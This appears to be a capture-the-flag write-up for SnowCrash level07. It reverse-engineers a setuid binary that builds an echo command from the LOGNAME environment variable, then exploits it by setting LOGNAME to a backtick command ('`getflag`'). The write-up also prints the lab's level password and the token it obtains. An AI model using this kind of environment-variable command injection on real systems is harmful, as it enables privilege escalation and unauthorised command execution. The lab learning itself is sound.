ssh level06@ip -p 4242

su level07

pwd: wiok45aaoguiboiki2tuin6ub

using binary ninja:
```
var_1c = 0
eax_8 = getenv(0x8048680)  {"LOGNAME"}
var_28_2 = eax_8
var_30_2 = &var_1c
asprintf(var_30_2, 0x8048688, var_28_2)  {"/bin/echo %s "}
```
```
char *getenv(const char *name) 
searches for the environment string pointed to by name and returns the associated value.

```
```
If you use sprintf() , you need to allocate a buffer first, and you need to be sure that 
the buffer is large enough to contain what sprintf writes. Otherwise sprintf() will happily overwrite whatever memory 
lies beyond the end of the buffer.

char* buffer = malloc(5 * sizeof(char));
// writes "123456" +null but overruns the buffer
sprintf(buffer, "%s%s%s", "12", "34", "56");

```
or simply using ltrace

```
level07@SnowCrash:~$ ltrace ./level07
getenv("LOGNAME") 
asprintf(0xbffff704, 0x8048688, 0xbfffff4e, 0xb7e5ee55, 0xb7fed280)

```


so, 

```
level07@SnowCrash:~$ LOGNAME='`getflag`'
level07@SnowCrash:~$
level07@SnowCrash:~$
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```